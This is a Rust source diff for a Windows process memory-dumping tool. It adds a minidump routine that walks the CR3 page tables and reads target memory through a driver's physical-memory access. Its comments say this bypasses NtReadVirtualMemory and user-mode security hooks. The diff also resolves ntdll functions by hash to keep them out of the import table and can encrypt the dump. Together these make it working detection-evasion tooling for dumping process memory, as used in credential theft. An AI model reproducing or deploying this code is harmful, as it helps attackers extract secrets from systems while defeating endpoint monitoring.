@@ -139,7 +139,7 @@ pub fn create_minidump(
     // 2. Enumerate loaded modules in target process
     println!("    Enumerating modules...");
     let modules =
-        enumerate_modules(process).map_err(|e| format!("Module enumeration failed: {}", e))?;
+        enumerate_modules(process, api).map_err(|e| format!("Module enumeration failed: {}", e))?;
     println!("    Found {} modules", modules.len());
 
     // 3. Read committed memory regions
@@ -169,6 +169,235 @@ pub fn create_minidump(
     std::fs::write(output_path, &dump).map_err(|e| format!("Failed to write dump: {}", e))?;
 
     Ok(dump_size)
+}
+
+/// Create minidump via physical memory reads — bypasses NtReadVirtualMemory entirely.
+///
+/// Uses CR3 page table walk to translate VAs to physical addresses,
+/// then reads physical memory directly via the driver engine.
+pub fn create_minidump_phys<F>(
+    api: &ApiResolver,
+    process: HANDLE,
+    cr3: u64,
+    read_phys: &F,
+    output_path: &str,
+    encrypt: bool,
+) -> Result<u64, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    // 1. Get system info
+    println!("    Collecting system info...");
+    let sys_info = collect_system_info();
+
+    // 2. Enumerate loaded modules (uses NtQueryVirtualMemory — dynamic, not NtReadVirtualMemory)
+    println!("    Enumerating modules...");
+    let modules =
+        enumerate_modules(process, api).map_err(|e| format!("Module enumeration failed: {}", e))?;
+    println!("    Found {} modules", modules.len());
+
+    // 3. Read memory via physical memory (page table walk — bypasses all user-mode hooks)
+    println!("    Reading memory regions via physical memory...");
+    let regions = read_memory_regions_phys(api, process, cr3, read_phys)
+        .map_err(|e| format!("Physical memory read failed: {}", e))?;
+
+    let total_mem: u64 = regions.iter().map(|r| r.size).sum();
+    println!(
+        "    Read {} regions, {:.2} MB total",
+        regions.len(),
+        total_mem as f64 / 1048576.0
+    );
+
+    // 4. Build minidump
+    println!("    Assembling minidump...");
+    let mut dump = build_minidump(&sys_info, &modules, &regions);
+
+    // 5. Optionally encrypt
+    if encrypt {
+        println!("    Encrypting dump...");
+        dump = crypto::encrypt_dump(&mut dump);
+    }
+
+    // 6. Write to disk
+    let dump_size = dump.len() as u64;
+    std::fs::write(output_path, &dump).map_err(|e| format!("Failed to write dump: {}", e))?;
+
+    Ok(dump_size)
+}
+
+/// Translate virtual address to physical address via x64 4-level page table walk.
+///
+/// CR3 → PML4 → PDPT → PD → PT → Physical Page
+/// Supports 4KB pages, 2MB large pages, and 1GB huge pages.
+fn translate_va_to_pa<F>(cr3: u64, va: u64, read_phys: &F) -> Result<u64, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    let mut entry = [0u8; 8];
+
+    // PML4
+    let pml4_idx = ((va >> 39) & 0x1FF) as u64;
+    read_phys((cr3 & 0x000F_FFFF_FFFF_F000) + pml4_idx * 8, &mut entry)?;
+    let pml4e = u64::from_le_bytes(entry);
+    if pml4e & 1 == 0 {
+        return Err("PML4E not present".into());
+    }
+
+    // PDPT
+    let pdpt_idx = ((va >> 30) & 0x1FF) as u64;
+    read_phys((pml4e & 0x000F_FFFF_FFFF_F000) + pdpt_idx * 8, &mut entry)?;
+    let pdpte = u64::from_le_bytes(entry);
+    if pdpte & 1 == 0 {
+        return Err("PDPTE not present".into());
+    }
+    if pdpte & 0x80 != 0 {
+        // 1GB huge page
+        return Ok((pdpte & 0x000F_FFFF_C000_0000) | (va & 0x3FFF_FFFF));
+    }
+
+    // PD
+    let pd_idx = ((va >> 21) & 0x1FF) as u64;
+    read_phys((pdpte & 0x000F_FFFF_FFFF_F000) + pd_idx * 8, &mut entry)?;
+    let pde = u64::from_le_bytes(entry);
+    if pde & 1 == 0 {
+        return Err("PDE not present".into());
+    }
+    if pde & 0x80 != 0 {
+        // 2MB large page
+        return Ok((pde & 0x000F_FFFF_FFE0_0000) | (va & 0x1F_FFFF));
+    }
+
+    // PT
+    let pt_idx = ((va >> 12) & 0x1FF) as u64;
+    read_phys((pde & 0x000F_FFFF_FFFF_F000) + pt_idx * 8, &mut entry)?;
+    let pte = u64::from_le_bytes(entry);
+    if pte & 1 == 0 {
+        return Err("PTE not present".into());
+    }
+
+    Ok((pte & 0x000F_FFFF_FFFF_F000) | (va & 0xFFF))
+}
+
+/// Read a virtual memory region via physical memory using page table walk.
+/// Reads page-by-page, translating each VA to PA.
+fn read_region_phys<F>(cr3: u64, va: u64, size: usize, read_phys: &F) -> Vec<u8>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    let mut result = vec![0u8; size];
+    let mut offset = 0usize;
+
+    while offset < size {
+        let current_va = va + offset as u64;
+        let page_offset = (current_va & 0xFFF) as usize;
+        let chunk_size = std::cmp::min(0x1000 - page_offset, size - offset);
+
+        if let Ok(pa) = translate_va_to_pa(cr3, current_va, read_phys) {
+            let _ = read_phys(pa, &mut result[offset..offset + chunk_size]);
+        }
+        // If page not present, leave zeros — this is normal for paged-out memory
+
+        offset += chunk_size;
+    }
+    result
+}
+
+/// Read committed memory regions via physical memory — no NtReadVirtualMemory calls.
+///
+/// Uses NtQueryVirtualMemory (dynamic, class 0) to enumerate regions,
+/// then reads each region via CR3 page table walk + physical memory read.
+fn read_memory_regions_phys<F>(
+    api: &ApiResolver,
+    process: HANDLE,
+    cr3: u64,
+    read_phys: &F,
+) -> Result<Vec<MemRegion>, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    let mut regions = Vec::new();
+    let mut address: u64 = 0;
+
+    // Resolve NtQueryVirtualMemory dynamically for region enumeration
+    type FnNtQueryVirtualMemory =
+        unsafe extern "system" fn(isize, *const u8, u32, *mut u8, usize, *mut usize) -> i32;
+    let nt_query_vm: FnNtQueryVirtualMemory = unsafe {
+        std::mem::transmute(
+            api.ntdll(resolver::HASH_NT_QUERY_VIRTUAL_MEMORY)
+                .ok_or("Failed to resolve NtQueryVirtualMemory")?,
+        )
+    };
+
+    // MEMORY_BASIC_INFORMATION struct for NtQueryVirtualMemory(class=0)
+    #[repr(C)]
+    #[derive(Default)]
+    struct MemBasicInfo {
+        base_address: u64,
+        allocation_base: u64,
+        allocation_protect: u32,
+        _pad1: u32,
+        region_size: u64,
+        state: u32,
+        protect: u32,
+        type_: u32,
+        _pad2: u32,
+    }
+
+    loop {
+        let mut mbi = MemBasicInfo::default();
+        let mut ret_len = 0usize;
+        let status = unsafe {
+            nt_query_vm(
+                process.0 as isize,
+                address as *const u8,
+                0, // MemoryBasicInformation
+                &mut mbi as *mut _ as *mut u8,
+                std::mem::size_of::<MemBasicInfo>(),
+                &mut ret_len,
+            )
+        };
+
+        if status < 0 || ret_len == 0 {
+            break;
+        }
+
+        // MEM_COMMIT=0x1000, readable and not guarded
+        let protect = mbi.protect;
+        if mbi.state == 0x1000 // MEM_COMMIT
+            && (protect == 0x02  // PAGE_READONLY
+                || protect == 0x04  // PAGE_READWRITE
+                || protect == 0x08  // PAGE_WRITECOPY
+                || protect == 0x20  // PAGE_EXECUTE_READ
+                || protect == 0x40  // PAGE_EXECUTE_READWRITE
+                || protect == 0x80) // PAGE_EXECUTE_WRITECOPY
+            && protect & 0x100 == 0
+        // Not PAGE_GUARD
+        {
+            let region_size = mbi.region_size as usize;
+            // Read via physical memory — completely bypasses NtReadVirtualMemory
+            let data = read_region_phys(cr3, mbi.base_address, region_size, read_phys);
+
+            // Only include regions where we actually read non-zero data
+            if data.iter().any(|&b| b != 0) {
+                regions.push(MemRegion {
+                    base: mbi.base_address,
+                    size: data.len() as u64,
+                    data,
+                });
+            }
+        }
+
+        address = mbi.base_address + mbi.region_size;
+        if address == 0 {
+            break;
+        }
+    }
+
+    if regions.is_empty() {
+        return Err("No readable memory regions found via physical memory".into());
+    }
+
+    Ok(regions)
 }
 
 fn collect_system_info() -> MinidumpSystemInfo {
@@ -255,56 +484,196 @@ fn collect_system_info() -> MinidumpSystemInfo {
     }
 }
 
-fn enumerate_modules(process: HANDLE) -> Result<Vec<ModuleInfo>, String> {
-    use windows::Win32::System::ProcessStatus::*;
-
+fn enumerate_modules(process: HANDLE, api: &ApiResolver) -> Result<Vec<ModuleInfo>, String> {
     let mut modules_out = Vec::new();
+    let mut seen_bases = std::collections::HashSet::new();
+    let mut address: u64 = 0;
+
+    // Resolve NtQueryVirtualMemory dynamically (not in IAT)
+    type FnNtQueryVirtualMemory = unsafe extern "system" fn(
+        isize,      // ProcessHandle
+        *const u8,  // BaseAddress
+        u32,        // MemoryInformationClass
+        *mut u8,    // MemoryInformation
+        usize,      // MemoryInformationLength
+        *mut usize, // ReturnLength
+    ) -> i32;
+
+    let nt_query_vm: FnNtQueryVirtualMemory = unsafe {
+        std::mem::transmute(
+            api.ntdll(resolver::HASH_NT_QUERY_VIRTUAL_MEMORY)
+                .ok_or("Failed to resolve NtQueryVirtualMemory")?,
+        )
+    };
+
+    // Resolve NtReadVirtualMemory for reading PE headers
+    type FnNtReadVirtualMemory =
+        unsafe extern "system" fn(isize, *const u8, *mut u8, usize, *mut usize) -> i32;
+    let nt_read: FnNtReadVirtualMemory = unsafe {
+        std::mem::transmute(
+            api.ntdll(resolver::HASH_NT_READ_VIRTUAL_MEMORY)
+                .ok_or("Failed to resolve NtReadVirtualMemory")?,
+        )
+    };
 
     unsafe {
-        // Get module handles
-        let mut h_modules: [HMODULE; 1024] = [HMODULE::default(); 1024];
-        let mut cb_needed = 0u32;
-
-        EnumProcessModulesEx(
-            process,
-            h_modules.as_mut_ptr(),
-            std::mem::size_of_val(&h_modules) as u32,
-            &mut cb_needed,
-            LIST_MODULES_ALL,
-        )
-        .map_err(|e| format!("EnumProcessModulesEx: {}", e))?;
-
-        let count = cb_needed as usize / std::mem::size_of::<HMODULE>();
-
-        for i in 0..count {
-            let mut mod_info = MODULEINFO::default();
-            if GetModuleInformation(
+        loop {
+            let mut mbi = MEMORY_BASIC_INFORMATION::default();
+            let result = VirtualQueryEx(
                 process,
-                h_modules[i],
-                &mut mod_info,
-                std::mem::size_of::<MODULEINFO>() as u32,
-            )
-            .is_ok()
+                Some(address as *const _),
+                &mut mbi,
+                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
+            );
+
+            if result == 0 {
+                break;
+            }
+
+            // Detect module base: MEM_IMAGE type at its AllocationBase
+            if mbi.Type == MEM_IMAGE
+                && mbi.BaseAddress == mbi.AllocationBase
+                && !seen_bases.contains(&(mbi.AllocationBase as u64))
             {
-                // Get module name
-                let mut name_buf = [0u16; 260];
-                let name_len = GetModuleFileNameExW(process, h_modules[i], &mut name_buf);
-                let name = if name_len > 0 {
-                    String::from_utf16_lossy(&name_buf[..name_len as usize])
+                seen_bases.insert(mbi.AllocationBase as u64);
+
+                // Get mapped filename via NtQueryVirtualMemory (class 2 = MemoryMappedFilenameInformation)
+                let mut name_buf = vec![0u8; 1024];
+                let mut ret_len = 0usize;
+                let status = nt_query_vm(
+                    process.0 as isize,
+                    mbi.BaseAddress as *const u8,
+                    2, // MemoryMappedFilenameInformation
+                    name_buf.as_mut_ptr(),
+                    name_buf.len(),
+                    &mut ret_len,
+                );
+
+                let name = if status >= 0 && ret_len > 8 {
+                    // UNICODE_STRING: Length (u16) + MaximumLength (u16) + pad(u32) + Buffer (wchar_t*)
+                    // The buffer contents follow inline after the UNICODE_STRING header
+                    let length = u16::from_le_bytes([name_buf[0], name_buf[1]]) as usize;
+                    let char_count = length / 2;
+                    // String data starts at offset 8 (after UNICODE_STRING struct on x64)
+                    let str_offset = std::mem::size_of::<usize>() + std::mem::size_of::<usize>();
+                    if str_offset + length <= ret_len {
+                        let wide: Vec<u16> = (0..char_count)
+                            .map(|i| {
+                                u16::from_le_bytes([
+                                    name_buf[str_offset + i * 2],
+                                    name_buf[str_offset + i * 2 + 1],
+                                ])
+                            })
+                            .collect();
+                        let nt_path = String::from_utf16_lossy(&wide);
+                        // Convert NT device path to DOS path
+                        nt_device_path_to_dos(&nt_path)
+                    } else {
+                        format!("unknown_{:X}", mbi.AllocationBase as u64)
+                    }
                 } else {
-                    format!("unknown_{:X}", mod_info.lpBaseOfDll as u64)
+                    format!("unknown_{:X}", mbi.AllocationBase as u64)
+                };
+
+                // Read PE header to get SizeOfImage
+                let mut pe_header = [0u8; 0x200]; // first 512 bytes
+                let mut bytes_read = 0usize;
+                let read_status = nt_read(
+                    process.0 as isize,
+                    mbi.BaseAddress as *const u8,
+                    pe_header.as_mut_ptr(),
+                    pe_header.len(),
+                    &mut bytes_read,
+                );
+
+                let size_of_image = if read_status >= 0 && bytes_read >= 0x200 {
+                    // Parse PE: DOS header -> e_lfanew -> SizeOfImage
+                    let e_magic = u16::from_le_bytes([pe_header[0], pe_header[1]]);
+                    if e_magic == 0x5A4D {
+                        let e_lfanew = u32::from_le_bytes([
+                            pe_header[0x3C],
+                            pe_header[0x3D],
+                            pe_header[0x3E],
+                            pe_header[0x3F],
+                        ]) as usize;
+                        if e_lfanew + 0x58 < pe_header.len() {
+                            let pe_sig = u32::from_le_bytes([
+                                pe_header[e_lfanew],
+                                pe_header[e_lfanew + 1],
+                                pe_header[e_lfanew + 2],
+                                pe_header[e_lfanew + 3],
+                            ]);
+                            if pe_sig == 0x4550 {
+                                // SizeOfImage at OptionalHeader offset 0x38 (for PE32+)
+                                let off = e_lfanew + 0x18 + 0x38;
+                                u32::from_le_bytes([
+                                    pe_header[off],
+                                    pe_header[off + 1],
+                                    pe_header[off + 2],
+                                    pe_header[off + 3],
+                                ])
+                            } else {
+                                mbi.RegionSize as u32
+                            }
+                        } else {
+                            mbi.RegionSize as u32
+                        }
+                    } else {
+                        mbi.RegionSize as u32
+                    }
+                } else {
+                    mbi.RegionSize as u32
                 };
 
                 modules_out.push(ModuleInfo {
-                    base: mod_info.lpBaseOfDll as u64,
-                    size: mod_info.SizeOfImage,
+                    base: mbi.AllocationBase as u64,
+                    size: size_of_image,
                     name,
                 });
+            }
+
+            address = mbi.BaseAddress as u64 + mbi.RegionSize as u64;
+            if address == 0 {
+                break;
             }
         }
     }
 
     Ok(modules_out)
+}
+
+/// Convert NT device path (\Device\HarddiskVolume3\...) to DOS path (C:\...)
+fn nt_device_path_to_dos(nt_path: &str) -> String {
+    // Try to map \Device\HarddiskVolumeN to drive letter
+    for letter in b'A'..=b'Z' {
+        let drive = format!("{}:", letter as char);
+        let mut target_buf = [0u16; 260];
+        let len = unsafe {
+            windows::Win32::Storage::FileSystem::QueryDosDeviceW(
+                windows::core::PCWSTR(
+                    drive
+                        .encode_utf16()
+                        .chain(std::iter::once(0))
+                        .collect::<Vec<u16>>()
+                        .as_ptr(),
+                ),
+                Some(&mut target_buf),
+            )
+        };
+        if len > 0 {
+            // Find null terminator
+            let end = target_buf
+                .iter()
+                .position(|&c| c == 0)
+                .unwrap_or(len as usize);
+            let device = String::from_utf16_lossy(&target_buf[..end]);
+            if nt_path.starts_with(&device) {
+                return format!("{}{}", drive, &nt_path[device.len()..]);
+            }
+        }
+    }
+    // Fallback: return original
+    nt_path.to_string()
 }
 
 fn read_memory_regions(api: &ApiResolver, process: HANDLE) -> Result<Vec<MemRegion>, String> {
